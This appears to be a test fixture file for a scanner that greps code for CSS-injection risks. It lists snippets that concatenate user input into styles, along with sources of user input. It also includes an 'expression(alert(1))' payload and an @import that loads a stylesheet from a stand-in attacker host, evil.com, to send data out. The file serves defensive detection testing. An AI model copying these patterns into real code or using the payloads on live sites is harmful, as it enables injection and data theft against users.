# css-injection-scanner grep coverage test fixtures
# Each non-comment line must be detected by at least one grep pattern

<div style="color: ${userInput}">
element.style.cssText = 'background: ' + userInput
sheet.insertRule('.user { color: ' + color + ' }')
el.setAttribute('style', 'color: ' + userColor)
const sheets = document.styleSheets
const decl = element.style  // CSSStyleDeclaration
element.style += '; background: ' + bgColor
<div [style]="dynamicStyle">
div { background: expression(alert(1)) }
@import url('https://evil.com/exfil.css')
.avatar { background: url(${userInput}) }
const q = searchParams.get('theme')
@RequestParam String color
const theme = req.query.color
